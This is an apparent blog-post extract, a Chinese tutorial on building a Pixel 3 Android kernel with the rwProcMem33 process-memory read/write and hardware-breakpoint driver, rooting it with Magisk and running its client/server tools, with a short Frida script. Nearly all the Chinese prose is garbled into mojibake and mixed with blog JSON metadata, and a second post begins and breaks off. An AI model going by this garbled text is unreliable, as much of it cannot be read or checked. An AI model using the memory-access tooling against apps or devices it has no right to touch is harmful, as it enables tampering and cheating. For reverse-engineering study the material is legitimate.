è¿è¡Œ Ubuntu é•œåƒ docker run -it --net host --name Akernel ubuntu /bin/bash# å®‰è£… sudo,vim apt-get updateapt-get install vimapt-get install sudo# ä¿®æ”¹ apt-get çš„è½¯ä»¶æºä¸ºé˜¿é‡Œæº sudo cp /etc/apt/sources.list /etc/apt/sources.list_backupsudo vim /etc/apt/sources.listæ›¿æ¢ä¸ºå¦‚ä¸‹å†…å®¹ deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse# deb http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverseéšåå°† apt-get æ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬ sudo apt-get updatesudo apt-get upgradesudo apt-get install build-essential# å®‰è£…å¿…è¦çš„åº“ sudo apt-get install git-core gnupg flex bison build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 libncurses5 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig libssl-dev bc kmod cpio git curl# ä¸º git é…ç½®åŸºæœ¬ä¿¡æ¯ git config --global user.email \"xxx@gmail.com\"git config --global user.name \"xxx\"git config --global http.proxy 192.168.27.1:7890# å®‰è£… repo mkdir ~/bincurl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repochmod a+x ~/bin/repo# ä¿®æ”¹ repo çš„ä¸‹è½½æºä¸ºæ¸…åæºï¼Œå¹¶æ·»åŠ  repo è‡³å…¨å±€å˜é‡ # æ‰“å¼€å…¨å±€å˜é‡é…ç½®æ–‡ä»¶ sudo vim ~/.bashrc# æ·»åŠ å…¨å±€å˜é‡ åœ¨æœ«å°¾æ·»åŠ è¿™ä¸‰è¡Œå¹¶ä¿å­˜ # repoexport REPO_URL='https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/'export PATH=\"~/bin:$PATH\"# ä½¿é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ source ~/.bashrc# å®‰è£… python å¦‚æœä½¿ç”¨ python --version æœ‰æ‰“å° python ç‰ˆæœ¬çš„è¯ï¼Œé‚£ä¹ˆè¿™ä¸€æ­¥å°±ä¸éœ€è¦äº†ï¼Œå¦‚æœ docker ä¸­æ²¡æœ‰å®‰è£… python , åœ¨ docker å†…ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£… sudo apt-get install software-properties-commonadd-apt-repository ppa:deadsnakes/ppasudo apt install python3.9sudo ln -s /usr/bin/python3 /usr/bin/python# ä¿®æ”¹äº¤æ¢åŒºå¤§å° ä¸ºäº†é˜²æ­¢ç¼–è¯‘æºç çš„è¿‡ç¨‹ä¸­ç”±äºäº¤æ¢åŒºä¸è¶³è€Œå¤±è´¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»ä¿®æ”¹è™šæ‹Ÿæœºçš„äº¤æ¢åŒºçš„å¤§å° # å¦‚æœæç¤º No such file or directoryï¼Œé‚£å°±ç›´æ¥è¿›è¡Œä¸‹é¢è®¾ç½®äº¤æ¢åŒºçš„æ“ä½œsudo swapoff /swapfilesudo rm /swapfile# è®¾ç½®äº† 32g äº¤æ¢åŒºï¼Œé˜²æ­¢ç¼–è¯‘å¤±è´¥ï¼Œæ‰§è¡Œä¸‹åˆ—å‘½ä»¤éœ€è¦èŠ±è´¹ä¸€æ®µæ—¶é—´ï¼Œå¦‚æœæ‰§è¡Œå‘½ä»¤åæ²¡æœ‰è¾“å‡ºï¼Œè¯·è€å¿ƒç­‰å¾…å‘½ä»¤æ‰§è¡Œå®Œæ¯•sudo dd if=/dev/zero of=/swapfile bs=1GB count=32sudo chmod 600 /swapfilesudo mkswap -f /swapfilesudo swapon /swapfile# ä¸‹è½½å†…æ ¸æºç  # æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬å· è¿™é‡Œæˆ‘çš„ pixel3 çš„å†…æ ¸ç‰ˆæœ¬ä¸º Linux version 4.9.270-g862f51bac900-ab7613625 adb shell cat /proc/versionLinux version 4.9.270-g862f51bac900-ab7613625 (android-build@abfarm-east4-101) (Android (7284624, based on r416183b) clang version 12.0.5 (https://android.googlesource.com/toolchain/llvm-project c935d99d7cf2016289302412d708641d52d2f7ee)) #0 SMP PREEMPT Thu Aug 5 07:04:42 UTC 2021# æŸ¥çœ‹å†…æ ¸æºç åˆ†æ”¯ è¿›å…¥ building-kernels ä¸­æŸ¥çœ‹è‡ªå·±çš„æºç åˆ†æ”¯ï¼Œå¦‚å›¾æˆ‘çš„æ‰‹æœºå‹å·ä¸º pixel3 , å¹¶ä¸”å†…æ ¸ç‰ˆæœ¬ä¸º 4.9, äºæ˜¯å°±çŸ¥é“å†…æ ¸æºç çš„ä»£å·æ˜¯ android-msm-crosshatch-4.9 ä¹‹åè¿›å…¥å®‰å“å†…æ ¸æºç åˆ—è¡¨ä¸­ï¼Œæœç´¢å†…æ ¸æºç ä»£å· android-msm-crosshatch-4.9 æˆ‘çš„æ‰‹æœºæ˜¯å®‰å“ 12, æ‰€ä»¥æˆ‘ä¸‹è½½çš„å†…æ ¸ç‰ˆæœ¬ä¸º android-msm-crosshatch-4.9-android12 è¿™é‡Œçš„ qpr1 å’Œ qpr2 , æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ QPR çš„å®šä¹‰ï¼Œç®€å•æ¥è¯´å°±æ˜¯ QPR åé¢è·Ÿçš„æ•°å­—è¶Šé«˜ï¼Œå†…æ ¸ç‰ˆæœ¬å°±è¶Šæ–° QPR, of course, is short for the Quarterly Platform Release, which Google first introduced with Android 12. These are not full system updates, but they bring a few select changes to the Pixels and other great high-end phones that opt to receive them. æ³¨æ„ä¸€ç‚¹å°±æ˜¯ä¾‹å¦‚ä½ æƒ³è¦ä¸‹è½½ android-msm-crosshatch-4.9-android10, è¯·å…ˆè¿›å…¥ä½ æƒ³è¦ä¸‹è½½çš„ AOSP çš„åœ°å€ï¼Œçœ‹çœ‹ä»“åº“ä¸­çš„ default.xml æ–‡ä»¶ï¼Œé‡ç‚¹å…³æ³¨ &lt;project path=&quot;build&quot; name=&quot;kernel/build&quot; , å¦‚æœ revision çš„å€¼ä¸º main , è¯·åƒä¸‡ä¸è¦ä¸‹è½½ï¼Œå¦åˆ™ä½ å°±ä¼šå‘ç°ä¸‹è½½ä¸‹æ¥ä¹‹åæ ¹æœ¬æ— æ³• build!!, è¿™æ˜¯ç”±äº build ä»“åº“å’Œå†…æ ¸æºç ä»“åº“ä¸åŒæ­¥å¯¼è‡´çš„ å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©è¿›å…¥ kernel/build ä¸­æ‰¾åˆ°é€‚åˆä½ çš„ build file , ä¸è¿‡æˆ‘è¿˜æ˜¯å»ºè®®èƒ½ä¸€é”®ç¼–è¯‘å°±ä¸€é”®ç¼–è¯‘ï¼Œæ¯”å¦‚æˆ‘ä¸‹è½½çš„ android-msm-crosshatch-4.9-android12 , build å’Œ kernel source code å°±æ˜¯åŒæ­¥çš„ (æƒ¨ç—›çš„æ•™è®­ï¼Œå¤´é“æƒ³è¦ç”¨å®‰å“ 9 çš„å†…æ ¸æºç ç¼–è¯‘ï¼Œç»“æœæ ¹æœ¬æ— æ³• buildâ€¦ æœ€åè¿˜æ˜¯å¦¥åæŠŠæ‰‹æœºåˆ·æˆå®‰å“ 12 äº†) # ä¸‹è½½å†…æ ¸æºç  mkdir android-kernel &amp;&amp; cd android-kernelrepo init -u https://android.googlesource.com/kernel/manifest -b android-msm-crosshatch-4.9-android12repo sync -j4# åˆ‡æ¢ git åˆ†æ”¯ æˆ‘çš„æ‰‹æœºçš„ Linux å†…æ ¸ç‰ˆæœ¬ä¸º Linux version 4.9.270-g862f51bac900-ab7613625 , g åé¢è·Ÿçš„æ˜¯ git åˆ†æ”¯ï¼Œæ‰€ä»¥åˆ‡æ¢çš„åˆ†æ”¯ä¸º 862f51bac900 cd private/msm-googlegit checkout 862f51bac900# ç¼–è¯‘å†…æ ¸æºç  # è§£åŒ… boot.img é¦–å…ˆä¸‹è½½ android-image-kitchen ç„¶åå°† boot.img æ”¾åœ¨å·¥å…·çš„æ ¹ç›®å½•ä¸‹ï¼Œè¿™é‡Œçš„ boot.img å°±æ˜¯ç½‘ä¸Šä¸‹è½½çš„åˆ·æœºåŒ…è§£å‹ä¹‹åå…¶ä¸­çš„ boot.img ç„¶åè¿è¡Œ unpackimg.bat , è¿è¡Œä¹‹åçš„çª—å£è¯·ä¸è¦å…³é—­ï¼Œå› ä¸ºè¾“å‡ºä¸­æœ‰éœ€è¦åç»­ä½¿ç”¨åˆ°çš„å‚æ•°ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å°†è¾“å‡ºçš„å†…å®¹å¤åˆ¶ä¸‹æ¥åˆ° txt ä¸­ Android Image Kitchen - UnpackImg Scriptby osm0sis @ xda-developersSupplied image: boot.imgRemoving old work folders and files . . .Setting up work folders . . .Image type: AOSPSignature with \"AVBv2\" type detected.Splitting image to \"split_img/\" . . .ANDROID! magic found at: 0BOARD_KERNEL_CMDLINE console=ttyMSM0,115200n8 androidboot.console=ttyMSM0 printk.devkmsg=on msm_rtb.filter=0x237 ehci-hcd.park=3 service_locator.enable=1 cgroup.memory=nokmem lpm_levels.sleep_disabled=1 usbcore.autosuspend=7 loop.max_part=7 androidboot.boot_devices=soc/1d84000.ufshc androidboot.super_partition=system buildvariant=userBOARD_KERNEL_BASE 0x00000000BOARD_NAMEBOARD_PAGE_SIZE 4096BOARD_HASH_TYPE sha1BOARD_KERNEL_OFFSET 0x00008000BOARD_RAMDISK_OFFSET 0x01000000BOARD_SECOND_OFFSET 0x00000000BOARD_TAGS_OFFSET 0x00000100BOARD_OS_VERSION 12.0.0BOARD_OS_PATCH_LEVEL 2021-10BOARD_HEADER_VERSION 2BOARD_HEADER_SIZE 1660BOARD_DTB_SIZE 863100BOARD_DTB_OFFSET 0x01f00000Unpacking ramdisk to \"ramdisk/\" . . .Compression used: gzip56773 blocksDone!è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .å½“ unpackimg.bat è¿è¡Œå®Œæ¯•åï¼Œæˆ‘ä»¬è¿›å…¥ split_img/ , ç„¶åè§£å‹å…¶ä¸­çš„ boot.img-ramdisk.cpio.gz , å¹¶å°†è§£å‹åçš„ boot.img-ramdisk.cpio æ–‡ä»¶å¤åˆ¶åˆ°å†…æ ¸æºç æ ¹ç›®å½•ä¸­ root@oacia-virtual-machine:/home/oacia/Desktop/# docker cp boot.img-ramdisk.cpio Akernel:/android-kernel/# ä¸‹è½½ mkbootimg.py æˆ‘ä»¬è¿˜éœ€è¦ä¸‹è½½ mkbootimg.py, å¹¶å°†å…¶å¤åˆ¶åˆ°æ”¾åˆ°å†…æ ¸æºç æ ¹ç›®å½• docker cp mkbootimg.py Akernel:/android-kernel/# ä¿®æ”¹ build.sh åœ¨å†…æ ¸æºç æ ¹ç›®å½•ï¼Œè¿›å…¥ build/build.sh , æ‰¾åˆ°ä¸‹æ–¹ä»£ç çš„ä½ç½® echo \"========================================================\"echo \" Files copied to $&#123;DIST_DIR&#125;\"å¹¶åœ¨è¿™ä¸¤è¡Œä»£ç ä¹‹å‰åŠ ä¸Šä¸‹åˆ—å‘½ä»¤ if [ -f \"$&#123;VENDOR_RAMDISK_BINARY&#125;\" ]; thencp $&#123;VENDOR_RAMDISK_BINARY&#125; $&#123;DIST_DIR&#125;fi # ä¸‹è½½ rwProcMem33 ä¸‹è½½åœ°å€ https://github.com/abcz316/rwProcMem33ç„¶åå°†è§£å‹åçš„æ–‡ä»¶å¤¹å¤åˆ¶åˆ° docker ä¸­å†…æ ¸æºç ç›®å½•ä¸‹çš„ private/msm-google/drivers/ ä¸­ docker cp rwProcMem33 Akernel:/android-kernel/private/msm-google/drivers/# ä¿®æ”¹ rwProcMem33 # ver_control.h å°† MY_LINUX_VERSION_CODE åˆ‡æ¢åˆ°å¯¹åº”çš„å®‰å“å†…æ ¸ç‰ˆæœ¬ï¼Œæˆ‘ä»¬åœ¨ä¸‹è½½å†…æ ¸æºç é˜¶æ®µå·²ç»é€šè¿‡ cat /proc/version çŸ¥é“äº†å†…æ ¸çš„ç‰ˆæœ¬å·ä¸º Linux version 4.9.270-g862f51bac900-ab7613625 , æ‰€ä»¥åœ¨ private/msm-google/drivers/rwProcMem33/ver_control.h å’Œ private/msm-google/drivers/rwProcMem33/hwBreakpointProcModule/hwBreakpointProc/ver_control.h ä¸­æˆ‘ä»¬ä¹Ÿå°†å†…æ ¸åˆ‡æ¢åˆ°å¯¹åº”çš„ 4.9 ç‰ˆæœ¬ï¼Œé€‰æ‹© MY_LINUX_VERSION_CODE çš„åŸåˆ™é€‰è¿™é‡Œå‡ºç°çš„ç‰ˆæœ¬å·ä¸­è¶Šæ¥è¿‘è‡ªå·±æ‰‹æœºå†…æ ¸ç‰ˆæœ¬çš„ç‰ˆæœ¬å· åœ¨ Linux 4.11 å‰ï¼ŒLinux å†…æ ¸æŠŠé¡µè¡¨åˆ†ä¸º 4 çº§ é¡µå…¨å±€ç›®å½• (Page Global Directoryï¼ŒPGD) é¡µä¸Šå±‚ç›®å½• (Page Upper Directoryï¼ŒPUD) é¡µä¸­é—´ç›®å½• (Page Middle Directoryï¼ŒPMD) ç›´æ¥é¡µè¡¨ (Page Tableï¼ŒPT) æ‰€ä»¥å¯¹äº Linux version 4.11 ä»¥ä¸‹çš„å†…æ ¸ç‰ˆæœ¬ï¼Œå¹¶ä¸æ”¯æŒäº”çº§é¡µè¡¨ï¼Œé€‰æ‹© å¯ç”¨è¯»å–pagemapæ–‡ä»¶æ¥è®¡ç®—ç‰©ç†å†…å­˜çš„åœ°å€ ï¼ŒåŒæ—¶æ³¨é‡Šæ‰ å¯ç”¨é¡µè¡¨è®¡ç®—ç‰©ç†å†…å­˜çš„åœ°å€ å¦‚å›¾æ‰€ç¤º Linux version 4.11 ç‰ˆæœ¬æŠŠé¡µè¡¨æ‰©å±•åˆ°äº”çº§ï¼Œåœ¨é¡µå…¨å±€ç›®å½•å’Œé¡µä¸Šå±‚ç›®å½•ä¹‹é—´å¢åŠ äº†é¡µå››çº§ç›®å½• (Page 4th Directoryï¼ŒP4D) æ‰€ä»¥å¯¹äº Linux version 4.11 åŠä»¥ä¸Šçš„å†…æ ¸ç‰ˆæœ¬ï¼Œé€‰æ‹© å¯ç”¨é¡µè¡¨è®¡ç®—ç‰©ç†å†…å­˜çš„åœ°å€ ï¼ŒåŒæ—¶æ³¨é‡Šæ‰ å¯ç”¨è¯»å–pagemapæ–‡ä»¶æ¥è®¡ç®—ç‰©ç†å†…å­˜çš„åœ°å€ å¦‚å›¾æ‰€ç¤º # linux_kernel_api æ–‡ä»¶å¤¹ åœ¨ rwProcMem33/linux_kernel_api æ–‡ä»¶å¤¹ä¸­æ–°å»ºä¸€ä¸ªå¤´æ–‡ä»¶ linux_kernel_api.h å¹¶å†™å…¥å¦‚ä¸‹å†…å®¹ #ifndef LINUX_KERNEL_API_H_#define LINUX_KERNEL_API_H_#include \"../ver_control.h\"#if MY_LINUX_VERSION_CODE &lt; KERNEL_VERSION(5,8,0)long probe_kernel_read(void* dst, const void* src, size_t size);MY_STATIC long x_probe_kernel_read(void* bounce, const char* ptr, size_t sz) &#123; return probe_kernel_read(bounce, ptr, sz);&#125;#endif#if MY_LINUX_VERSION_CODE >= KERNEL_VERSION(5,8,0)long copy_from_kernel_nofault(void* dst, const void* src, size_t size);MY_STATIC long x_probe_kernel_read(void* bounce, const char* ptr, size_t sz) &#123; return copy_from_kernel_nofault(bounce, ptr, sz);&#125;#endif#endif /* LINUX_KERNEL_API_H_ */# api_proxy.h ä¸ºäº†åŒ…å« linux_kernel_api.h å¤´æ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨ api_proxy.h çš„å‰å‡ è¡Œä¸­åŠ å…¥ #include &quot;linux_kernel_api/linux_kernel_api.h&quot; å¦‚å›¾ # ä¿®æ”¹ drivers çš„ Makefile åœ¨ private/msm-google/drivers/Makefile çš„å¼€å¤´åŠ å…¥ä¸‹åˆ—å‘½ä»¤ obj-y += rwProcMem33/hwBreakpointProcModule/hwBreakpointProc/obj-y += rwProcMem33/# ä¿®æ”¹ msm-google çš„ Makefile åœ¨ç¼–è¯‘ rwProcMem33 å†…æ ¸æ¨¡å—æ—¶ï¼Œç”±äºå†…æ ¸ç¼–è¯‘æ—¶ä¼šå°†è­¦å‘Šè§†ä¸ºé”™è¯¯å¯¼è‡´ç¼–è¯‘å†…æ ¸åœæ­¢ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹ Makefile æ¥å¿½è§† warning åœ¨ private/msm-google/Makefile æ‰¾åˆ°å¦‚ä¸‹ä½ç½®ï¼Œåœ¨ -Wno-format-security ååŠ ä¸Šä¸€ä¸ª -w å‚æ•° # å¼€å§‹ç¼–è¯‘ åœ¨å®‰å“å†…æ ¸æºç çš„æ ¹ç›®å½•æ‰“å¼€ç»ˆç«¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¼€å§‹ç¼–è¯‘ å‘½ä»¤çš„å‚æ•°ä¸ºä½¿ç”¨ android-image-kitchen è§£åŒ… boot.img ä¹‹åï¼Œæ§åˆ¶å°æ‰€æ‰“å°çš„å‚æ•° è¯·åŠ¡å¿…æ›¿æ¢ä¸ºç›¸å¯¹åº”çš„å‚æ•°ï¼ï¼ï¼ å‚æ•°å¯¹åº”å…³ç³»ä¸º android-image-kitchen è§£åŒ…å‚æ•°åç§° å€¼ ç¼–è¯‘å‘½ä»¤å‚æ•°åç§° BOARD_KERNEL_CMDLINE console=ttyMSM0,115200n8 androidboot.console=ttyMSM0 printk.devkmsg=on msm_rtb.filter=0x237 ehci-hcd.park=3 service_locator.enable=1 cgroup.memory=nokmem lpm_levels.sleep_disabled=1 usbcore.autosuspend=7 loop.max_part=7 androidboot.boot_devices=soc/1d84000.ufshc androidboot.super_partition=system buildvariant=user KERNEL_CMDLINE BOARD_KERNEL_BASE 0x00000000 BASE_ADDRESS BOARD_PAGE_SIZE 4096 PAGE_SIZE BOARD_HEADER_VERSION 2 BOOT_IMAGE_HEADER_VERSION ç¼–è¯‘å‘½ä»¤ä¸­çš„ BUILD_CONFIG ä¸º AOSP æºç æ ¹ç›®å½•çš„ build.config çš„è½¯è¿æ¥æ‰€æŒ‡å‘çš„é…ç½®æ–‡ä»¶ æ‰€ä»¥æœ€ç»ˆçš„ç¼–è¯‘å‘½ä»¤ä¸º BUILD_CONFIG=private/msm-google/build.config.bluecross BUILD_BOOT_IMG=1 MKBOOTIMG_PATH=mkbootimg.py VENDOR_RAMDISK_BINARY=boot.img-ramdisk.cpio KERNEL_BINARY=Image.lz4 BOOT_IMAGE_HEADER_VERSION=2 KERNEL_CMDLINE=\"console=ttyMSM0,115200n8 androidboot.console=ttyMSM0 printk.devkmsg=on msm_rtb.filter=0x237 ehci-hcd.park=3 service_locator.enable=1 cgroup.memory=nokmem lpm_levels.sleep_disabled=1 usbcore.autosuspend=7 loop.max_part=7 androidboot.boot_devices=soc/1d84000.ufshc androidboot.super_partition=system buildvariant=user\" BASE_ADDRESS=0x00000000 PAGE_SIZE=4096 build/build.shç»è¿‡ä¸€æ®µæ—¶é—´çš„ç­‰å¾…ï¼Œç¼–è¯‘æˆåŠŸï¼ ç”Ÿæˆçš„ boot.img çš„è·¯å¾„ä¸º /android-kernel/out/android-msm-pixel-4.9/dist/boot.img # ä½¿ç”¨ Magisk ä¿®è¡¥ boot.img å®ç° root å®‰è£… Magisk ä¸‹è½½åœ°å€ adb install \"D:\\TOOLS\\pixel3\\Magisk-v26.1.apk\"å°†ç”±å†…æ ¸æºç ç¼–è¯‘å‡ºæ¥çš„ boot.img ä¸Šä¼ åˆ°æ‰‹æœºä¸Š adb push boot.img /sdcard/ç„¶ååœ¨æ‰‹æœºä¸Šæ‰“å¼€ Magisk , ä¾æ¬¡ç‚¹å‡» å®‰è£…-&gt;é€‰æ‹©å¹¶ä¿®è¡¥ä¸€ä¸ªæ–‡ä»¶-&gt;/sdcard/boot.img-&gt;å¼€å§‹ å¾…ä¿®è¡¥å®Œæˆåï¼Œå°†ä¿®è¡¥åçš„ boot.img ä¼ åˆ°ç”µè„‘ä¸Š adb pull /storage/emulated/0/Download/magisk_patched-xxxxx_xxxxx.img# åˆ·å…¥å†…æ ¸ adb reboot bootloaderfastboot flash boot magisk_patched-xxxxx_xxxxx.imgfastboot reboot# ç¼–è¯‘ HwBpClient å®¢æˆ·ç«¯ è¿›å…¥ rwProcMem33\\hwBreakpointProcModule\\testHwBpClient æ–‡ä»¶å¤¹ï¼ŒåŒå‡» testHwBpClient.vcxproj åœ¨ visual studio ä¸­æ‰“å¼€ ç¼–è¯‘çš„ç¨‹åºä½æ•°åº”ä¸º 64 ä½ å¯¹äº Windows å¹³å°ç¼–è¯‘çš„ HwBpClient , å¹¶ä¸”éœ€è¦åœ¨ testHwBpClientDlg.cpp çš„è¿™ä¸ªä½ç½®è¿›è¡Œä¿®æ”¹ï¼Œå°†è¿™ä¸ªä½ç½®çš„ llX æ”¹ä¸º I64X , %zu æ”¹æˆ I64d , å¦åˆ™å°†æ— æ³•æ­£ç¡®è¾“å…¥å†…å®¹ åŸå› åœ¨äº C/C++ è¾“å‡º 64 ä½æ•°åœ¨ window ä¸‹å’Œ linux ä¸‹æ˜¯ä¸ä¸€æ ·çš„ linux printf(\"%lld/n\",a);printf(\"%llu/n\",a);printf(\"%llx/n\",a);windows printf(\"%I64d/n\",a);printf(\"%I64u/n\",a);printf(\"%I64x/n\",a);ä¿®æ”¹å®Œæˆåå¦‚å›¾æ‰€ç¤º æ¥ä¸‹æ¥æŒ‰ä¸‹ ctrl+B ç”Ÿæˆå³å¯ # ç¼–è¯‘ HwBpServer æœåŠ¡ç«¯ ç¼–è¯‘ HwBpServer æœåŠ¡ç«¯éœ€è¦ NDK, å¹¶å°† NDK å¼•å…¥ç¯å¢ƒå˜é‡ä¸­ NDK å¯ä»¥åœ¨ android studio ä¸­è¿›è¡Œå®‰è£…ï¼Œä¾æ¬¡ç‚¹å‡» File-&gt;Project Structure-&gt;SDK Location , æ‰¾åˆ° Android NDK location , ç‚¹å‡» Download å³å¯å¼€å§‹å®‰è£…ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„ ndk çš„ç‰ˆæœ¬ä¸º ndk25.2.9519653 å¦‚æœæ²¡æœ‰å®‰è£… Android studio ,NDK çš„å®‰è£…æ–¹æ³•å¯ä»¥åœ¨è°·æ­Œä¸Šæ‰¾åˆ° NDK å®‰è£…å®Œæˆåï¼Œè¿›å…¥åˆ° rwProcMem33\\hwBreakpointProcModule\\testHwBpServer\\jni , æ‰“å¼€ cmd è¿è¡Œå‘½ä»¤ ndk-buildå³å¯å®Œæˆç¼–è¯‘ï¼Œç¼–è¯‘åçš„æ–‡ä»¶åœ¨ rwProcMem33\\hwBreakpointProcModule\\testHwBpServer\\libs ä¸­ï¼Œé€‰æ‹©å¯¹åº”æ‰‹æœºæ¶æ„çš„ ELF, push åˆ°æ‰‹æœºä¸­è¿è¡Œå³å¯ # è·å–æ‰‹æœºçš„ IPv4 åœ°å€ å°†ç”µè„‘å’Œæˆ‘ä»¬çš„æµ‹è¯•æ‰‹æœºè¿æ¥åŒä¸€ä¸ªæ‰‹æœºçƒ­ç‚¹ï¼Œç„¶ååœ¨æµ‹è¯•æ‰‹æœºä¸­æ‰“å¼€ è®¾ç½®-&gt;WLAN ç‚¹å‡»æˆ‘ä»¬è¿æ¥çš„çƒ­ç‚¹çš„é«˜çº§é€‰é¡¹ï¼Œæ¥æŸ¥çœ‹æ‰‹æœºçš„ IP åœ°å€ # è¿è¡Œ HwBpServer æœåŠ¡ç«¯ å°†ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºå¤åˆ¶åˆ°æ‰‹æœºä¸­å¹¶è¿è¡Œ adb push rwProcMem33\\hwBreakpointProcModule\\testHwBpServer\\libs\\arm64-v8a\\testHwBpServer.out /data/local/tmpadb shellsucd /data/local/tmpchmod 777 testHwBpServer.out./testHwBpServer.outæŸ¥çœ‹æ‰“å°å‡ºæ¥çš„ç«¯å£å· 3170 # è¿è¡Œ HwBpClient å®¢æˆ·ç«¯ åœ¨ç”µè„‘ä¸­è¿è¡Œç¼–è¯‘å®Œæˆçš„ HwBpClient å®¢æˆ·ç«¯ï¼Œå¡«å…¥æ‰‹æœºçš„ IP åœ°å€ä»¥åŠç”± testHwBpServer.out æ‰“å°å‡ºæ¥çš„ç«¯å£å· ç‚¹å‡»è¿æ¥å³å¯å¼€å§‹æ‰“ç¡¬ä»¶æ–­ç‚¹ # æŸ¥è¯¢è¿›ç¨‹ PID ps -A# æŸ¥è¯¢ç›®æ ‡ so çš„åŸºå€ å¯ä»¥ä½¿ç”¨å‘½ä»¤æ¥æŸ¥è¯¢ cat /proc/[appçš„PID]/mapsä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ frida è„šæœ¬æŸ¥è¯¢ so çš„åŸºå€ function dump_so(so_name) &#123; Java.perform(function () &#123; var currentApplication = Java.use(\"android.app.ActivityThread\").currentApplication(); var dir = currentApplication.getApplicationContext().getFilesDir().getPath(); var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); &#125; &#125;);&#125;rpc.exports = &#123; dump_so: dump_so&#125;;æ¥ä¸‹æ¥å°±å¯ä»¥æ„‰å¿«çš„æ‰“ç¡¬ä»¶æ–­ç‚¹å•¦ï½ # å‚è€ƒèµ„æ–™ [åŸåˆ›] å¼€æºä¸€ä¸ª Linux å†…æ ¸é‡Œè¿›ç¨‹å†…å­˜ç®¡ç†æ¨¡å—æºç  ä¸‡å­—é•¿æ–‡æ•™ä½ ä½¿ç”¨å®‰å“å†…æ ¸é©±åŠ¨è¿›è¡Œå†…å­˜è¯»å†™ å®‰å“å†…æ ¸é©±åŠ¨ç¼–è¯‘ AOSP Android 10 å†…æ ¸ç¼–è¯‘åˆ·å…¥ Pixel3 kernel ç¼–è¯‘çš„å“ªäº›å‘ eBPF on Android ä¹‹æ‰“è¡¥ä¸å’Œç¼–è¯‘å†…æ ¸ä¿®æ­£ç‰ˆ Android10 å†…æ ¸ç¼–è¯‘ç¬”è®°","categories":[],"tags":[{"name":"rwProcMem33","slug":"rwProcMem33","permalink":"https://oacia.dev/tags/rwProcMem33/"},{"name":"android kernel","slug":"android-kernel","permalink":"https://oacia.dev/tags/android-kernel/"}]},{"title":"Pixel3 åˆ·æœºä¸rootè®°å½•","slug":"Pixel3-root","date":"2023-08-08T06:34:45.000Z","updated":"2024-05-04T05:46:19.034Z","comments":true,"path":"Pixel3-root/","link":"","permalink":"https://oacia.dev/Pixel3-root/","excerpt":"","text":"ä»Šå¹´ä¸ŠåŠå¹´æŠŠæˆ‘çš„è€å¹³æ¿ SM-P200 root äº†ï¼Œä¸è¿‡ç”¨ç€ç”¨ç€å°±å‘ç°è¿™å¹³æ¿çš„ USB ç«Ÿç„¶æ¥è§¦ä¸è‰¯ï¼æ¯è¿‡ä¸€æ®µæ—¶é—´ usb å°±ä¼šæ–­å¼€è¿æ¥â€¦ az, è¿™å¯¹äºæˆ‘æ¥è¯´é—®é¢˜å¯æ˜¯è‡´å‘½çš„ï¼Œè°èƒ½å¿å—ç ”ç©¶çš„å¥½å¥½çš„çªç„¶æ‰‹æœºå°±å¤±è”äº†å˜ äºæ˜¯æˆ‘åœ¨å’¸é±¼æ·˜äº†ä¸€å°äºŒæ‰‹ pixel3, è‡³äºä¸ºä»€ä¹ˆæ˜¯ pixel3, é—®å°±æ˜¯è°·æ­Œäº²å„¿å­ï½ çœ‹äº†çœ¼æ‰‹æœºå·²ç»åˆ·æˆå®‰å“ 10 äº†ï¼Œå–å®¶ä¹Ÿè¯´è§£äº† BL é”ï¼Œä¸è¿‡å”¯ä¸€ç¾ä¸­ä¸è¶³çš„å°±æ˜¯å®‰å“ 10 æ²¡ root, é‚£å°±åªèƒ½äº²è‡ª root å’¯ï½ æƒ³äº†æƒ³å®‰å“ 10 å®‰è¯ä¹¦æœ‰ç‚¹éº»çƒ¦ï¼Œç´¢æ€§å°±åˆ·æˆå®‰å“ 9 å¥½äº†å“ˆå“ˆ # å‡†å¤‡å·¥ä½œ åœ¨è¿›è¡Œåˆ·æœºå‰ï¼Œè¯·ç¡®ä¿å·²ç»æå‰å‡†å¤‡ä»¥ä¸‹å†…å®¹ (å¯¹äºç©å®‰å“çš„åº”è¯¥éƒ½æŒºç®€å•çš„å§ï½) å®‰è£… ADB ç¯å¢ƒï¼Œå¦‚æ²¡æœ‰ ADB ç¯å¢ƒè¯·å‚è€ƒè¿™ç¯‡æ–‡ç«  æ‰‹æœºç‚¹å‡» è®¾ç½®-&gt;å…³äºæ‰‹æœº-&gt;ç‰ˆæœ¬å· ï¼Œè¿æŒ‰ 7 æ¬¡è¿›å…¥å¼€å‘è€…æ¨¡å¼ï¼Œç‚¹å‡» 